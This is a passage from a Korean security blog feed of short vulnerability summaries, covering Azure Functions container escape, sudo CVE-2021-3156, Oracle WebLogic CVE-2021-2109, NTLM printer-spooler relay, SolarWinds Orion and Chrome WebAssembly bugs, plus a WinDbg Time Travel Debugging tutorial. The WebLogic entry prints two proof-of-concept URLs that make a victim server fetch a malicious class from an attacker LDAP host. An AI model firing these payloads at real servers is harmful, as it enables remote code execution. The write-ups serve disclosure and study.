    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.intezer.com/blog/research/how-we-hacked-azure-functions-and-escaped-docker/">How We Hacked Azure Functions and Escaped Docker</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Azure Functions</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft <a href="https://azure.microsoft.com/ko-kr/services/functions/">Azure Functions</a>에서 권한 상승 및 Azure Functions 도커 컨테이너를 escape 할 수 있는 취약점이 발견되었습니다.</p><p>Azure Functions은 AWS의 Lambda 서비스처럼 인프라의 provision이나 관리 없이 유저가 코드를 실행할 수 있는 기능입니다. Azure Functions은 HTTP request를 통해 트리거 할 수 있으며 Azure-managed container에서 코드가 실행됩니다.</p><p>Azure Functions의 Mesh 바이너리는 syscall_mount 등의 mount 기능을 사용하므로 권한 없는 사용자가 HTTP 서버를 통해 해당 서비스에 접근하면 권한 상승을 할 수 있습니다. Mesh 바이너리에 존재하는 <code>mount_RunSquash</code> 함수는 <a href="https://github.com/vasi/squashfuse">squashfuse_II</a> 함수를 호출하여 <code>filePath</code> 경로에 지정된 squashfs 이미지를 <code>targetPath</code> 경로에 마운트 합니다. <a href="https://linux.die.net/man/5/sudoers">sudoers</a> 메커니즘을 통해 사용자에게 루트 권한을 주는 파일이 포함된 <a href="https://tldp.org/HOWTO/SquashFS-HOWTO/whatis.html">squashfs 파일 시스템</a>을 생성하여 sudoers.d에 이미지를 마운트 하면 권한 상승을 할 수 있습니다.</p><p>하지만 권한 상승이 되더라도 컨테이너 안에 존재하므로 도커를 escape 해야 합니다. Azure Functions의 컨테이너는 <code>--privileged</code> 모드로 실행되어 시스템의 모든 장치에 접근 가능하며 커널의 기능 대부분을 사용할 수 있습니다. 따라서 <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">해당 문서</a>에 존재하는 기법을 통하여 Docker의 host에서 명령어 수행이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
      <tag>escape</tag>
      
      <tag>azure</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-3156 : heap overflow in sudo</title>
    <link href="/2021/01/27/fabu1ous/2021-01-27/"/>
    <url>/2021/01/27/fabu1ous/2021-01-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">CVE-2021-3156 : heap-based buffer overflow in sudo</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>sudo &lt; 1.9.5p2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Qualys Research Team에서 CVE-2021-3156에 대한 세부 정보를 공개했습니다. sudo는 잠시 다른 유저의 권한을 갖고 프로그램을 실행할 수 있게 해주는 명령어로 거의 모든 Unix 계열 운영체제에서 사용합니다. sudo에 Heap-based Buffer Overlow 취약점이 존재하여 이를 통해 root 권한으로 상승할 수 있습니다.</p><p>sudo에 <code>-s</code> 옵션을 붙여 <code>MODE_SHELL</code> flag값을 설정하거나 <code>-i</code> 옵션을 붙여 <code>MODE_LOGIN_SHELL</code> flag값을 설정하면 sudo의 <code>main()</code>에서 argv를 재설정합니다. 모든 command line argument의 meta-character앞에 <code>\</code>(백슬래쉬)를 추가해 escape 한 뒤 하나의 문자열로 묶습니다(concatenate). 만약 하나로 묶인 command line argument가 <code>\</code>로 끝나면 </p><pre><code class="hljs routeros"><span class="hljs-built_in">..</span>.<span class="hljs-keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; <span class="hljs-built_in">..</span>. <span class="hljs-keyword">for</span> (<span class="hljs-keyword">to</span> = user_args, av = NewArgv + 1; (<span class="hljs-keyword">from</span> = <span class="hljs-number">*a</span>v); av++) &#123; <span class="hljs-keyword">while</span> (<span class="hljs-number">*f</span>rom) &#123; <span class="hljs-keyword">if</span> (<span class="hljs-keyword">from</span>[0] == <span class="hljs-string">&#x27;\\&#x27;</span> &amp;&amp; !isspace((unsigned char)<span class="hljs-keyword">from</span>[1])) <span class="hljs-keyword">from</span>++; *<span class="hljs-keyword">to</span>++ = <span class="hljs-number">*f</span>rom++; &#125; *<span class="hljs-keyword">to</span>++ = <span class="hljs-string">&#x27; &#x27;</span>; &#125; <span class="hljs-built_in">..</span>. &#125;</code></pre><p>이를 heap-based buffer(<code>user_args</code>)에 옮기는 작업 중 NULL-terminator를 무시하고 out-of-bound copy를 하게 됩니다.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.gastonsanchez.com/r4strings/metacharacters.html">https://www.gastonsanchez.com/r4strings/metacharacters.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>linux</tag>
      
      <tag>unix</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-2109 : 오라클 Weblogic Server 원격 코드 실행 취약점</title>
    <link href="/2021/01/26/l0ch/2021-01-26/"/>
    <url>/2021/01/26/l0ch/2021-01-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw">Weblogic Server remote code execution vulnerability warning (CVE-2021-2109)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 및 14.1.1.0.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>오라클이 개발한 자바 웹 애플리케이션 서버인 Oracle WebLogic Server에서 JNDI Injection을 통한 원격 코드 실행 취약점의 세부 정보가 공개되었습니다.</p><blockquote><p>JNDI(Java Naming and Directory Interface) : 자바 애플리케이션에서 외부 디렉터리 서비스에 접근하기 위한 API로, 원격 서버의 객체를 bind 해 애플리케이션에서 접근할 수 있다.</p></blockquote><p>해당 취약점은 두 클래스에서 발생하며 취약점이 발생하는 첫 번째 클래스인 <code>com.bea.console.handles.JndiBindingHandle</code> 에서는 바인딩할 JNDI의 <code>context</code>, <code>bindName</code>, <code>serverName</code> 정보를 파라미터로 받아 이를 인스턴스화 하고 <code>JNDIBindingAction</code>에서 처리합니다. 각 파라미터의 의미와 공격 조건은 다음과 같습니다.</p><ul><li><p><code>context</code> : 원격 바인딩할 JNDI 서버 호스트</p><ul><li>JNDI 서버로 구성한 해커의 호스트</li></ul></li><li><p><code>bindName</code>: 바인딩할 JNDI 클래스 이름</p><ul><li>악성 코드를 실행하는 java 클래스 파일 이름</li></ul></li><li><p><code>serverName</code> : 바인딩할 서버 이름</p><ul><li><code>AdminServer</code></li></ul></li><li><p>각 필드는 세미콜론 <code>;</code>으로 구분됩니다.</p><br></li></ul><p>해커의 서버 포트 1088에 악성 코드를 실행하는 java 클래스 파일 <code>exploit</code> 이 존재한다면 PoC는 아래와 같습니다.</p><pre><code class="hljs java">http:<span class="hljs-comment">//[victim_host]/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(&quot;ldap://[attacker_host];1:1088/exploit;AdminServer&quot;)</span></code></pre><p>두 번째  <code>com.bea.console.handles.JndiContextHandle</code> 클래스에서는 <code>bindName</code>이 포함된 <code>context</code>와 <code>serverName</code>만을 받아 위와 동일한 환경에서 다음 PoC로 원격 코드 실행이 가능합니다.</p><pre><code class="hljs java">http:<span class="hljs-comment">//[victim_host]/console/console.portal?_nfpb=true&amp;_pageLabel=EJBTestHomePage&amp;EJBTestHomePagehandle=com.bea.console.handles.JndiContextHandle(&quot;ldap://[attacker_host]:1088/exploit;AdminServer&quot;)</span></code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/Al1ex/CVE-2021-2109">https://github.com/Al1ex/CVE-2021-2109</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>oracle</tag>
      
      <tag>jndi injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1678 : MSRPC Printer Spooler Relay</title>
    <link href="/2021/01/25/idioth/2021-01-25/"/>
    <url>/2021/01/25/idioth/2021-01-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.crowdstrike.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/?utm_content=sprout&utm_medium=soc&utm_source=twittere.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/">Security Advisory: MSRPC Printer Spooler Relay (CVE-2021-1678)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2021년 1월 12일 패치 이전<ul><li>Windows 7, 8.1, 10</li><li>Windows Server 2008, 2012, 2016, 2019</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2021년 1월 12일 Patch Tuesday에서 <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1678">CVE-2021-1678</a>이 패치되었습니다. 이 취약점을 통해 해커는 NTLM(<a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NT Lan Manager</a>) 인증 세션을 릴레이 하여 프린터 스풀러 MSRPC 인터페이로 원격 코드 실행이 가능합니다.</p><p>NTLM 릴레이는 해커가 클라이언트와 서버 사이에서 메시지나 정보들을 전달합니다. 해커는 클라이언트인 척 하지만, 서버는 클라이언트가 해커인지 알지 못하며 NTLM 인증 중 서버에서 제공한 정보를 통해 서버에 인증이 가능합니다. NTLM 인증은 보호 기능이 없으면 모든 프로토콜에서 다른 프로토콜로 릴레이 할 수 있습니다. 해당 취약점은 NTLM 릴레이 공격을 통해 MSRPC를 타게팅하여 이루어집니다.</p><p>MSRPC는 인증에 대한 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/425a7c53-c33a-4868-8e5b-2a850d40dc73">여러 가지 단계</a>가 있지만 <code>RPC_C_AUTHN_LEVEL_CONNECT</code>는 사용자 인증을 통한 전송에 암호화나 서명을 하지 않으므로 NTLM 릴레이 공격을 악용할 수 있습니다. RPC 인터페이스 중 <code>IRemoteWinspool</code>은 패킷 보안이 필요하지 않으므로 다음과 같은 방법으로 RPC 명령을 실행할 수 있습니다.</p><ol><li>NTLM 세션이 해커에 의해 제어되는 릴레이 머신에 설정</li><li>해커는 <code>IRemoteWinspool</code> 인터페이스에 바인딩하고 <code>RPC_C_AUTHN_LEVEL_CONNECT</code> 권한을 선택</li><li>NTLM 인증이 RPC 채널에서 해커에 의해 릴레이 됨</li><li>PrinterDemon 공격 흐름과 같이 PRC 명령이 실행됨:<ul><li><code>RpcAsyncInstallPrinterDriverFromPackage</code>(Opnum 62) - “generic/text” 프린터 드라이버 설치</li><li><code>RpcAsyncOpenPrinter</code> (Opnum 0)</li><li><code>RpcAsyncXcvData</code> (Opnum 33) - 포트 추가</li><li><code>RpcAsyncAddPrinter</code> (Opnum 1) - 드라이버에 따른 프린터 추가</li><li><code>RpcAsyncStartDocPrinter</code> (Opnum 10) - 새 문서 시작</li><li><code>RpcAsyncWritePrinter</code> (Opnum 12) - 새 문서 작성</li></ul></li></ol><p>해당 취약점은 <code>IRemoteWinspool</code>의 <code>RpcManager::VerifyRpcValidProtocolSequence</code>에서 <code>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</code> 이상의 레벨에서만 접근 가능하도록 패치되었습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://en.hackndo.com/ntlm-relay/#ntlm-relay">https://en.hackndo.com/ntlm-relay/#ntlm-relay</a></p><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-par/695e3f9a-f83f-479a-82d9-ba260497c2d0</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>ntlm realy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 시간을 여행하는 해커를 위한 안내서 Part1</title>
    <link href="/2021/01/24/fabu1ous/ttd-1/"/>
    <url>/2021/01/24/fabu1ous/ttd-1/</url>
    
    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p>Time Travel Debugging(TTD)는 2017년에 공개된 Windbg preview의 기능입니다. 공개된 지 3년이나 지났지만 아직 한글로 된 자세한 문서는 별로 없는 거 같더라고요. windbg preview를 쓴다거나 TTD의 존재를 아는 사람이 적어서 그런가 싶기도 하고… windbg로 디버깅을 처음 해본다거나 디버깅 자체를 처음 시작하려는 사람들에겐 한글로 된 문서가 문턱의 높이를 낮추는데 큰 도움이 된다고 생각합니다.</p><p>그래서 “내가 만들어 보지 뭐”라는 생각으로 직접 공부해보면서 작성해볼까 합니다.</p><p>대략 Part 3까지 생각 중이고, Part 4까지 추가로 할 수도 있어요.</p><ul><li>Part 1 : 간단 소개 및 첫인상</li><li>Part 2 : 구버전의 open source에서 발생하는 버그를 직접 분석해보는 실습</li><li>Part 3 : 크래쉬 분석에 사용해본 경험담</li><li>Part 4 : JavaScript를 이용한 자동화 및 고오오급 사용법</li></ul><h1 id="Time-Travel-Debugging"><a href="#Time-Travel-Debugging" class="headerlink" title="Time Travel Debugging"></a>Time Travel Debugging</h1><p><img src="/2021/01/24/fabu1ous/ttd-1/1.png"></p><p>불현듯이 과거에 저지른 실수 때문에 이불 킥을 하고 싶은 경험을 누구나 한 번쯤은 해봤을겁니다. 과거로 돌아가 모두 없던 일로 만들 수만 있다면 얼마나 좋을까요. 물론 그게 불가능하다는 사실이 더욱 가슴을 후벼 파며 사람을 미치게 만듭니다. 하지만 Microsoft의 Debugging Experience팀은 Debugging의 한에선 과거로 돌아가 저지른 실수를 만회할 수 있게 해 줍니다.</p><blockquote><p>Time Travel Debugging(TTD), is a tool that allows you to record an execution of your process running, then replay it later both forwards and backwards.</p></blockquote><p>TTD는 프로세스의 실행을 “되감기(rewind)”할 수 있기 때문에 매번 버그를 재 구현하는 번거로움을 덜고 디버깅할 수 있습니다. 게다가 MS 스토어에서 windbg preview를 설치하는 것만으로 TTD를 사용할 수 있다니…</p><p><img src="/2021/01/24/fabu1ous/ttd-1/2.png"></p><p>아니아니 무료라구요 손님</p><h1 id="기본적인-사용법"><a href="#기본적인-사용법" class="headerlink" title="기본적인 사용법"></a>기본적인 사용법</h1><h2 id="관리자-권한으로-실행"><a href="#관리자-권한으로-실행" class="headerlink" title="관리자 권한으로 실행"></a>관리자 권한으로 실행</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/3.png"></p><p>디버깅 타겟의 실행을 녹화해 만들어진 Trace file(이하 <code>.run</code>)을 씹고 뜯고 맛보고 즐긴다는 게 TTD의 매력입니다. 그전에 우선 windbg preview를 관리자 권한으로 실행하셔야 합니다. Input/Output 트레이싱을 기록하는 디버깅 방식은 이미 존재해왔지만 TTD는 이보다 좀 더 확장된 개념으로, 프로세스의 모든 실행을 기록해 <code>.run</code>을 만들기 때문에 상대적으로 높은 권한을 요구합니다.</p><h2 id="Trace-file-녹화하기"><a href="#Trace-file-녹화하기" class="headerlink" title="Trace file 녹화하기"></a>Trace file 녹화하기</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/4.png"></p><p>[상단 메뉴] &gt; [파일] &gt; [Launch executable (advanced)] &gt; 실행 파일 선택 &gt; [Record with TTD 체크 박스]</p><p>디버깅 타겟이 될 실행 파일을 선택해준 뒤 Record with Time Trabel Debugging를 체크해주시면 됩니다.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/5.png"></p><p>기본적으로 <code>.run</code>파일은 <code>C:\\Users\\username\\Documents</code>에 만들어집니다. 원하신다면 생성 경로를 바꾸실 수 있습니다. <code>.run</code>파일의 경로를 지정 후 Record 버튼을 누르시면 프로세스의 녹화가 시작됩니다.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/6.png"></p><p>타겟의 녹화가 진행되고 있음을 알려주는 팝업창이 뜬다면 정상적으로 녹화되고 있다는 뜻입니다. 이 팝업창에선 타겟 프로세스, 녹화 커멘드를 보여주며 이 녹화가 진정 내가 원하는 녹화가 맞는지 최종 확인하시면 됩니다.</p><p>물론 이 팝업창이 뜬다면 그런 건 신경 쓰지 마시고 최대한 빨리 디버깅하고자 하는 이슈나 버그를 재현해주셔야 합니다. 나중에 잠시 다룰 단점의 내용이지만 간단히 설명드리자면  <code>.run</code>파일이 크기가 생각보다 빨리 커집니다. 이 글을 쓰기 위해 재현하는데 대략 3~4초 정도 걸리는 크래쉬를 녹화했고 1.5GB 크기의 <code>.run</code>파일이 만들어졌습니다. 평균적으로 영화 한 편이 1.5GB입니다. 거기다 추가로  <code>.idx</code>라는 파일이 0.5GB를 차지하니 총 2GB나 사용하는군요. MSDOCS에 따르면 <code>.idx</code>파일은 보통  <code>.run</code>파일의 2배 정도의 크기가 된다고 합니다.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/7.png"></p><p>앞으로 이 <code>.run</code>파일만 있다면 디버깅을 하다가 다시 버그를 재현하는 번거로움을 없앨 수 있습니다. 보통 디버깅하다 실수한다거나 컨트롤이 버그 발생시점을 넘어가버리면 restart기능을 사용해 프로세스의 시작 시점으로 돌아가야 합니다. 간혹 restart기능이 안 먹거나 디버거 자체를 재시작해야 하는 경우엔 버그를 또다시 재현해야 해서 상당히 귀찮죠. 저는 이런 경우에 vm의 스냅샷을 이용하거나 <code>.bat</code>파일을 사용해 버그 재현을 자동화 하곤 했습니다. 우웩…</p><h1 id="TTD-쓰세요-두번-쓰세요"><a href="#TTD-쓰세요-두번-쓰세요" class="headerlink" title="TTD 쓰세요, 두번 쓰세요"></a>TTD 쓰세요, 두번 쓰세요</h1><p>지금까지 간단하게 TTD를 사용해본 제가 생각하는 장점, 그리고 MS에서 내세우고 있는 장점을 알아봅시다.</p><h2 id="Re-zero부터-시작하는-디버깅-우웩"><a href="#Re-zero부터-시작하는-디버깅-우웩" class="headerlink" title="Re:zero부터 시작하는 디버깅? 우웩"></a>Re:zero부터 시작하는 디버깅? 우웩</h2><p>아까 말씀드린 대로 디버깅하면서 프로세스의 시작 시점으로 돌아가는 일은 정말 빈번히 발생합니다. 이래서 우리 idioth형이 리버싱을 좋아하나 봐요. ㅋㅋㅋㅋ</p><p><img src="/2021/01/24/fabu1ous/ttd-1/8.png"></p><p>디버거 종류와 상관없이 조금 만져봤다 하시는 분들은 위 사진에서 각각 기능들이 무슨 동작을 하는지 익숙할 겁니다.</p><ol><li>GO : break point 위치까지 프로그램을 실행</li><li>Step Out : 현재 함수를 끝까지 실행 후 리턴</li><li>Step Into : instruction 한개 실행, 만약 함수를 호출하면 함수 내부로 진입</li><li>Step Over : instruction 한개 실행, 만약 함수를 호출하면 해당 함수를 끝까지 실행후 리턴</li></ol><p>GO를 진행하기 전에 break point 설정을 잘못했다거나, Step Into를 사용해 함수 내부로 진입해야 하는 상황에서 Step Over를 하게 될 경우 눈물을 머금고 restart버튼을 눌러야 하죠. 정말 잠시 집중을 안 하면 벌어지는 일이라 짜증 나기도 하고 break point의 한계를 생각해보면 여간 귀찮은 게 아닙니다. TTD는 이런 불편함을 어떻게 해결했을까요?</p><h2 id="Reverse-Flow-Control"><a href="#Reverse-Flow-Control" class="headerlink" title="Reverse Flow Control"></a>Reverse Flow Control</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/9.png"></p><p>TTD는 위에서 설명한 Flow Control 기능을 뒤집은 Reverse Flow Control을 제공합니다. 그냥 말 그대로 프로그램의 흐름을 거꾸로 거슬러 올러갈 수 있다는 뜻입니다. 아까 말한 대로 Step Into를 해야 할 상황에서 Step Over를 해버려서 분석해야 할 함수에 진입하지 못했다면 단순히 Step Over Back 하면 해결됩니다.</p><h2 id="Time-Travel-Position"><a href="#Time-Travel-Position" class="headerlink" title="Time Travel Position"></a>Time Travel Position</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/10.png"></p><p>그럼 단순히 현재 program counter 위치로부터 intruction을 거슬러 올라가는 게 끝이냐? 그랬다면 시간여행(Time Travel)이란 이름이 붙진 않았겠죠. 녹화 시작부터 녹화 종료 시점까지 실행된 instruction마다 Time Travel Position(이하 TTP)이란 값이 매겨지는데 break point의 상위 호환이라 생각하시면 됩니다.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/11.png"></p><p>예를 들어 <code>fabulous()</code>라는 함수가 있고 이 함수가 16번째 호출된 시점에서 함수 내부에 버그가 발생했다고 가정해 봅시다. 동적 디버깅을 위해 <code>fabulous()</code>함수 엔트리에 break point를 걸었다면 프로세스의 시작 시점부터 버그 발생 위치까지 해당 break point에 총 16번 걸려야 합니다.</p><p><img src="/2021/01/24/fabu1ous/ttd-1/12.png"></p><p>반면 Time Travel Position은 같은 함수의 같은 instruction일지라도 실행 시점이 다르다면 다른 값이 매겨집니다. <code>!tt</code>명령어를 사용해 임의의 TTP로 이동할 수 있으며 프로세스의 상태를 특정 시점으로 되돌릴 수 있습니다.</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p><img src="/2021/01/24/fabu1ous/ttd-1/13.png"></p><p>MS에서 내세우는 TTD의 장점 중 제가 단연 최고라 생각하는 기능은 바로 타임라인입니다. 처음엔 동영상 재생 바처럼 마우스로 드래그하거나 클릭해서 원하는 시점으로 갈 수 있을 줄 알았는데 반은 맞고 반은 틀린 생각이더군요. 전체 프로그램 흐름 중 주요 이벤트(Exception, Break Point, Function Call, Memory Access)의 위치를 그림으로 표현해 주며 타임라인에 표시된 각 이벤트를 클릭하면 프로세스의 상태를 해당 시점으로 변경해줍니다. 그 이외의 곳은 클릭해도 이동 안합니다. ㅎㅎ;; 너무 기대가 컸나?</p><p><img src="/2021/01/24/fabu1ous/ttd-1/14.png"></p><p>이벤트 중 Memory Access 같은 경우엔 특정 주소에 특정 동작(RWX)이 이루어질 때마다 타임라인에 기록되도록 지정할 수 있기 때문에 메모리 커럽션 같은 버그를 찾을 때 정말 유용하겠죠? 미디어 플레이어 딱 대</p><h1 id="단점"><a href="#단점" class="headerlink" title="단점"></a>단점</h1><p><img src="/2021/01/24/fabu1ous/ttd-1/15.png"></p><p>뭐… 사실 단점이라면 단점이지만 앞서 설명한 장점들에 비하면 이 정도는 충분히 감수할 수 있다고 봅니다.</p><h2 id="Trace-File-크기"><a href="#Trace-File-크기" class="headerlink" title="Trace File 크기"></a>Trace File 크기</h2><p>위에서 재현에 3~4초 걸리는 버그를 녹화한 결과로 2GB 정도의 디스크 용량을 차지한다고 했었죠? 만약 버그 재현에만 몇십 분을 소모한다고 생각하면 어후…</p><h2 id="녹화중-오버헤드"><a href="#녹화중-오버헤드" class="headerlink" title="녹화중 오버헤드"></a>녹화중 오버헤드</h2><p>사용하는 시스템의 사양이나 녹화 중 실행하는 코드의 양에 따라 천차만별인 데다 방금 언급한 Trace File의 크기에 직결되는 문제라 웬만하면 최대한 좋은 환경에서 빨리 녹화를 끝내도록 합시다.</p><h2 id="Read-only-Debugging"><a href="#Read-only-Debugging" class="headerlink" title="Read-only Debugging"></a>Read-only Debugging</h2><p>당연한 이야기지만 프로세스의 실행을 녹화하고 돌려보는 게 TTD라 다른 디버거들처럼 특정 레지스터나 메모리에 값을 임시로 변경하는 작업은 못해봅니다.</p><h2 id="권한"><a href="#권한" class="headerlink" title="권한"></a>권한</h2><p>아직까진 TTD로 User-mode 프로세스만 녹화가 가능합니다. Kernel-mode 프로세스는 안된다고 합니다.</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p><img src="/2021/01/24/fabu1ous/ttd-1/16.png"></p><p>이번 글은 거의 뭐 연구글이라기 보단 번역글 수준에서 끝난 거 같네요. 다음 글에선 실제로 버그를 분석해보는 실습을 해보겠습니다. 아마 구버전 오픈소스에서 발생하는 버그나 MSDOCS에서 TTD 연습용으로 제공하는 프로그램을 사용할 거 같습니다. 아니면 아예 다른 프로그램을 분석해 볼 수도 있고, 아직 정해진 건 없습니다. 그때까지 저는 크래쉬 분석하면서 TTD를 익혀올게요. 취약점도 찾고… ㅎㅎ;;</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windbg</tag>
      
      <tag>time travel debugging</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Three Bugs in Orion&#39;s belt</title>
    <link href="/2021/01/23/fabu1ous/2021-01-23/"/>
    <url>/2021/01/23/fabu1ous/2021-01-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/1/20/three-bugs-in-orions-belt-chaining-multiple-bugs-for-unauthenticated-rce-in-the-solarwinds-orion-platform">Three bugs in orion’s belt: Chaining multiple bugs for rce</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>SolarWinds Orion Platform</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ZDI에서 <a href="https://www.solarwinds.com/securityadvisory#anchor1">SunBurst</a> 사건과 관련된 3가지 취약점의 세부 정보를 공개했습니다. </p><ul><li><p>CVE-2020-14005</p><p>Alert Management 권한을 가진 SolarWinds 사용자는 SolarWinds Orion Platform의 web-based GUI 혹은 REST API를 통해 관리자 권한으로 원격 코드 실행을 할 수 있습니다. Alert Management 권한을 가진 사용자는 네트워크 이벤트를 처리할 VBS script의 경로를 지정할 수 있는데, 이 VBS script를 해석하고 실행할 interpreter의 경로 또한 API request의 내용을 조작해 임의로 설정이 가능합니다. 따라서 interpreter 대신 cmd.exe를 실행해 command injection을 할 수 있습니다.</p></li></ul><ul><li><p>CVE-2020-27869</p><p>특정 네트워크 이벤트 발생 시 서버로 보낼 GET 혹은 POST Request를 Configure Action 기능으로 설정할 수 있습니다. 해당 기능에서 SQL injection이 가능해 관리자 계정을 탈취할 수 있습니다.</p><pre><code class="hljs reasonml">...<span class="hljs-keyword">if</span> (messageWithMacros.<span class="hljs-constructor">Contains(<span class="hljs-string">&quot;$&#123;SQL:&quot;</span>)</span>)&#123;                     MacroParser.<span class="hljs-constructor">PrepareMacroStringForSQL(<span class="hljs-params">ref</span> <span class="hljs-params">messageWithMacros</span>)</span>;&#125;...</code></pre><p>서버에 보낼 POST request를 임의의 문자열로 지정할 수 있습니다. 만약 해당 문자열이 <code>$&#123;SQL:</code>를 포함하면 그 뒤에 따라오는 문자열을 SQL statement로 인식하고 처리하게 됩니다.</p></li></ul><ul><li><a href="https://hackyboiz.github.io/2021/01/02/fabu1ous/2021-01-02/">CVE-2020-10148</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15994 : Chrome WebAssembly Engine UAF 취약점</title>
    <link href="/2021/01/22/l0ch/2021-01-22/"/>
    <url>/2021/01/22/l0ch/2021-01-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.br0vvnn.io/pages/blogpost.aspx?id=5">Exploiting CVE-2020-15994 Chrome WebAssembly Engine UAF Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Google Chrome WebAssembly</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Chrome의 V8 WebAssembly 엔진에서 발견된 UAF 취약점에 대한 상세 정보가 공개되었습니다. WebAssembly는 JS의 단점을 보완하기 위해 브라우저에서 저수준 언어로 작성된 코드를 컴파일해 네이티브로 동작할 수 있도록 하는 기술 표준입니다.</p><p>WebAssembly의 <code>AsyncCompileJob</code> 객체는 <code>WebAssembly.instantiateStreaming</code> 함수에서 사용되는 기본 V8 객체이며 WebAssembly의 비동기 컴파일을 지원합니다. </p><p>취약점을 트리거하는 데 사용되는 함수는 다음과 같습니다.</p><p><code>AsyncCompileJob::FinishModule</code> - 컴파일된 WebAssembly 코드를 Javascript 객체로 인스턴스 화함<br><code>AsyncCompileJob::Abort</code> - WebAssembly 코드 다운로드 실패 시 호출되며 모든 컴파일 프로세스를 취소함<br>위 두 함수는 모두 <code>AsyncCompileJob</code> 객체를 해제하는 기능이 있습니다.</p><p><code>WebAssembly.instantiateStreaming</code> 함수를 이용하여 WebAssembly 코드를 컴파일하는 경우 WebAssembly 코드에서 Javascript 함수 및 